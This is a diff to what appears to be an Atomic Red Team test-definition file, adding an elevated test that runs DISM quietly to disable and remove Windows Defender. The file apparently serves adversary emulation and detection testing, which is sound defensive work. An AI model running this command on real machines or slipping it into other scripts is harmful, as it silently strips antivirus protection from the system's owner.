@@ -527,3 +527,16 @@ atomic_tests:
       Get-AntiPhishRule
     name: powershell
     elevation_required: false
+- name: Disable Windows Defender with DISM
+  description: | 
+    The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. 
+    DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.
+    A successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.
+    This method will remove Defender and it's package.
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
+    name: command_prompt
+    elevation_required: true
